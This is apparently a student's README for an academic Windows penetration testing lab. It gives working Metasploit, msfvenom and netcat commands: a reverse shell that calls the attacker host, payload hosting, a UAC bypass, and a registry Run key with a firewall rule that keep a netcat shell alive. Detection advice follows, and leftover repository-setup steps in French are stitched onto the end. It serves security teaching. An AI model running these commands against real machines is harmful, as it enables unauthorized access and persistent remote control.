# 🔴 Windows Penetration Testing Project

## ⚠️ Ethical Disclaimer

**THIS PROJECT IS FOR EDUCATIONAL PURPOSES ONLY**

All techniques demonstrated in this project were performed in a controlled lab environment with explicit authorization. These methods should **NEVER** be used on systems without proper authorization.

**Unauthorized access to computer systems is illegal and punishable by law.**

---

## 📋 Project Overview

Practical implementation of Windows penetration testing techniques using Metasploit Framework, demonstrating exploitation, post-exploitation, and persistence mechanisms in a controlled environment.

**Academic Project** | Master 2 - Sécurité des Systèmes d'Information | 2024-2025  
**Supervisor:** M. Moussa DIEDHIOU

---

## 🎯 Learning Objectives

- Understand Windows exploitation techniques
- Master Metasploit Framework and Meterpreter
- Implement post-exploitation strategies
- Establish persistence mechanisms
- Comprehend attacker TTPs (Tactics, Techniques, and Procedures)
- Develop defensive mindset through offensive security

---

## 🛠️ Technologies & Tools

### **Attack Platform**
- **Kali Linux** - Penetration testing distribution
- **Metasploit Framework** - Exploitation framework
- **Meterpreter** - Advanced payload
- **Msfvenom** - Payload generator
- **NetCat (nc)** - Network utility for reverse shells

### **Target Environment**
- **Windows 10** - Target operating system
- **NSClient++** - Windows monitoring agent (used as attack vector)

### **Techniques Implemented**
- Reverse TCP connections
- Payload generation and delivery
- User Account Control (UAC) bypass
- Registry-based persistence
- Windows Firewall manipulation
- Post-exploitation enumeration

---

## 🏗️ Lab Architecture
```
Attacker Machine                Target Machine
┌─────────────────┐            ┌─────────────────┐
│   Kali Linux    │            │   Windows 10    │
│  192.168.1.3    │◄──────────►│  192.168.1.2    │
│                 │   Exploit  │                 │
│  - Metasploit   │   Payload  │  - Vulnerable   │
│  - Msfvenom     │   Delivery │    Services     │
│  - NetCat       │            │  - NSClient++   │
└─────────────────┘            └─────────────────┘
        │                              │
        └──────────────┬───────────────┘
                       │
                  Network Switch
                  192.168.1.0/24
```

---

## 🔧 Attack Methodology

### **Phase 1: Reconnaissance**

**Network Discovery:**
```bash
# Host discovery
nmap -sn 192.168.1.0/24

# Port scanning
nmap -sV -p- 192.168.1.2

# Service enumeration
nmap -sC -sV 192.168.1.2
```

---

### **Phase 2: Exploitation**

#### **Method 1: NetCat Reverse Shell**

**On Kali Linux (Attacker):**
```bash
# Start NetCat listener
nc -lvp 4444
```

**On Windows 10 (Target):**
```cmd
# Establish reverse connection
ncat 192.168.1.3 4444 -e cmd.exe
```

**Result:** Direct command shell access

---

#### **Method 2: Msfvenom Payload**
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.3 \
  LPORT=3333 \
  -f exe \
  -o runme.exe
```

**Delivery:**
```bash
# Host on web server
mv runme.exe /var/www/html/
systemctl start apache2
```

---

#### **Method 3: Metasploit Handler**
```bash
msfconsole

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.3
set LPORT 3333
exploit -j
```

---

### **Phase 3: Post-Exploitation**

**Meterpreter Commands:**
```bash
sysinfo              # System information
getuid               # Current user
ps                   # Running processes
ipconfig             # Network config
```

---

### **Phase 4: UAC Bypass**
```bash
use exploit/windows/local/bypassuac_fodhelper
set SESSION 1
set LHOST 192.168.1.3
set LPORT 3333
exploit
```

**Result:** Administrative privileges without UAC prompt

---

### **Phase 5: Persistence**

**Registry Persistence:**
```bash
# Upload NetCat
upload /usr/share/windows-binaries/nc.exe C:\\Windows\\system32\\nc.exe

# Registry entry
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run \
  -v netcat \
  -d "C:\\Windows\\system32\\nc.exe -lvp 4445 -e cmd.exe"
```

**Firewall Rule:**
```cmd
netsh advfirewall firewall add rule ^
  name="netcat" ^
  protocol=TCP ^
  dir=in ^
  localport=4445 ^
  action=allow
```

---

## 🧪 Testing Results

| Attack Phase | Technique | Success Rate |
|-------------|-----------|--------------|
| Initial Access | NetCat reverse shell | ✅ 100% |
| Payload Delivery | Msfvenom executable | ✅ 100% |
| Exploitation | Meterpreter session | ✅ 100% |
| Privilege Escalation | UAC bypass | ✅ 100% |
| Persistence | Registry Run key | ✅ 100% |

---

## 🛡️ Detection & Prevention

### **How to Detect:**
- Monitor unusual outbound connections
- Detect registry Run key modifications
- Use EDR (Endpoint Detection and Response)
- Enable Windows Defender Real-Time Protection
- Monitor firewall rule changes

### **How to Prevent:**
1. ✅ Keep systems patched
2. ✅ Use robust antivirus
3. ✅ Enable Windows Defender
4. ✅ Implement application whitelisting
5. ✅ Use least privilege principle
6. ✅ Monitor registry changes
7. ✅ Network segmentation
8. ✅ Strong authentication (MFA)

---

## 🎓 Skills Developed

### **Technical Skills**
- Metasploit Framework proficiency
- Payload generation with Msfvenom
- Meterpreter post-exploitation
- Windows privilege escalation
- UAC bypass techniques
- Registry manipulation
- Persistence mechanisms
- Network reconnaissance

### **Security Concepts**
- Attack lifecycle (Kill Chain)
- Post-exploitation strategies
- Privilege escalation
- Defense evasion tactics
- Attacker TTPs
- Incident response

---

## 📚 References

- [Metasploit Framework Documentation](https://docs.metasploit.com/)
- [Meterpreter Basics](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)

### **Related Projects**
- [Secure Infrastructure with SIEM](https://github.com/Mariama321/secure-infrastructure-siem-wazuh)
- [Linux Network Services](https://github.com/Mariama321/linux-network-services-deployment)
- [Nagios Monitoring](https://github.com/Mariama321/nagios-security-monitoring)

---

## 👤 Author

**Mariama DIACK**  
Master 2 - Sécurité des Systèmes d'Information

**Contact:**
- 🌐 Portfolio: [mariama321.github.io](https://mariama321.github.io)
- 💼 LinkedIn: [linkedin.com/in/mariamd3](https://linkedin.com/in/mariamd3)
- 📧 Email: diackmariam3@gmail.com
- 💻 GitHub: [@Mariama321](https://github.com/Mariama321)

---

## 📄 Legal Notice

**IMPORTANT:** This project is strictly for educational purposes in a controlled academic environment. Misuse of these techniques is illegal and unethical.

---

⭐ **Remember: With great power comes great responsibility. Always hack ethically!** 🛡️
```

4. Commit : `Complete penetration testing documentation`

---

### **Action 3 : Ajouter les Topics**

1. Cliquez sur **⚙️** dans "About"
2. Ajoutez ces topics :
```
pentesting
metasploit
cybersecurity
ethical-hacking
kali-linux
windows
meterpreter
exploitation
red-team
hacking
security
reverse-shell
